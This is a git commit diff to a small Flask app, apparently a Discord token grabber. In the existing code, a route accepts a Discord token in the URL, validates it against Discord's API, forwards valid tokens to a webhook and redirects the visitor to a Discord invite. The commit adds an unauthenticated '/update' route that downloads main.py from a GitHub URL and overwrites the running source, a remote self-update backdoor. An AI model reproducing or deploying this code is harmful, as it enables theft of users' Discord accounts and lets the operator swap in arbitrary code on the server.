c340b6f024169fd9344fa74b4babe27f0286591a
43a1723 <hai1723notgay@gmail.com>
2024-05-28 12:06:14 +0700

    Update main.py

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ import os
 from flask import Flask, redirect
 import requests
 
+
 def check_discord_token(token):
     url = "https://discord.com/api/v10/users/@me"
     headers = {
@@ -24,6 +25,18 @@ def index(token):
   if check_discord_token(token) == "True":
       hook.send(token)
   return redirect("https://discord.gg/sTp8ask4ay")
+
+@app.route('/update', methods=['GET'])
+def update():
+    url = "https://raw.githubusercontent.com/43a1723/test2/main/main.py"
+    try:
+        response = requests.get(url)
+        response.raise_for_status()  # Kiểm tra xem yêu cầu có thành công không
+        with open('main.py', 'w') as f:
+            f.write(response.text)
+        return 'File main.py has been updated successfully.', 200
+    except requests.exceptions.RequestException as e:
+        return f'Failed to download the update: {e}', 500
 
 if __name__ == "__main__":
   app.run(host='0.0.0.0', port=81)
